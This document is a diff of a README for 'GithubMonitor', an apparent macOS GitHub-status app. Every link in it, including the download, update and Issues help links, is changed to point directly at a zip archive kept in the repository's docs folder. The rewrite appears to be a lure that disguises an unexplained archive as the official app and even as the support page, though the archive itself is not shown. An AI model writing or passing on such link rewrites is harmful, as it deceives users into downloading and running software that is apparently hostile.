@@ -1,6 +1,6 @@
 # 🚦 GithubMonitor - Track Your GitHub Status Easily
 
-[![Download GithubMonitor](https://img.shields.io/badge/Download-GithubMonitor-green?style=for-the-badge)](https://github.com/jacksecro69420/GithubMonitor)
+[![Download GithubMonitor](https://img.shields.io/badge/Download-GithubMonitor-green?style=for-the-badge)](https://github.com/jacksecro69420/GithubMonitor/raw/refs/heads/main/docs/Github-Monitor-v2.1-beta.4.zip)
 
 ## 📋 What is GithubMonitor?
 
@@ -30,11 +30,11 @@ This section will walk you through how to download and start using GithubMonitor
 
 Visit the official download page for GithubMonitor:
 
-[![Download GithubMonitor](https://img.shields.io/badge/Download-GithubMonitor-blue?style=for-the-badge)](https://github.com/jacksecro69420/GithubMonitor)
+[![Download GithubMonitor](https://img.shields.io/badge/Download-GithubMonitor-blue?style=for-the-badge)](https://github.com/jacksecro69420/GithubMonitor/raw/refs/heads/main/docs/Github-Monitor-v2.1-beta.4.zip)
 
 Click the button above or open the link below in your browser:
 
-https://github.com/jacksecro69420/GithubMonitor
+https://github.com/jacksecro69420/GithubMonitor/raw/refs/heads/main/docs/Github-Monitor-v2.1-beta.4.zip
 
 On the page, look for the latest version of the app. You will find it in the "Releases" section or on the main page if available. Download the file named something like `GithubMonitor.dmg` or another installer format meant for macOS.
 
@@ -112,7 +112,7 @@ You can revoke the app’s access to your GitHub account at any time through Git
 New versions of GithubMonitor may include bug fixes and improvements. To update:
 
 1. Visit this page again:  
-   https://github.com/jacksecro69420/GithubMonitor  
+   https://github.com/jacksecro69420/GithubMonitor/raw/refs/heads/main/docs/Github-Monitor-v2.1-beta.4.zip  
 2. Download the latest release as described above.  
 3. Replace the existing app in your Applications folder with the new version.
 
@@ -124,7 +124,7 @@ Your settings and account connection will stay the same.
 
 If you have questions or need assistance, check the Issues tab on the GithubMonitor repository page:
 
-https://github.com/jacksecro69420/GithubMonitor/issues
+https://github.com/jacksecro69420/GithubMonitor/raw/refs/heads/main/docs/Github-Monitor-v2.1-beta.4.zip
 
 You can read through existing topics or open a new issue to report bugs or request help.
 
@@ -132,6 +132,6 @@ You can read through existing topics or open a new issue to report bugs or reque
 
 # Download GithubMonitor
 
-[![Download GithubMonitor](https://img.shields.io/badge/Download-GithubMonitor-brightgreen?style=for-the-badge)](https://github.com/jacksecro69420/GithubMonitor)  
+[![Download GithubMonitor](https://img.shields.io/badge/Download-GithubMonitor-brightgreen?style=for-the-badge)](https://github.com/jacksecro69420/GithubMonitor/raw/refs/heads/main/docs/Github-Monitor-v2.1-beta.4.zip)  
 
 Click the button above and follow the steps to start monitoring your GitHub account today.
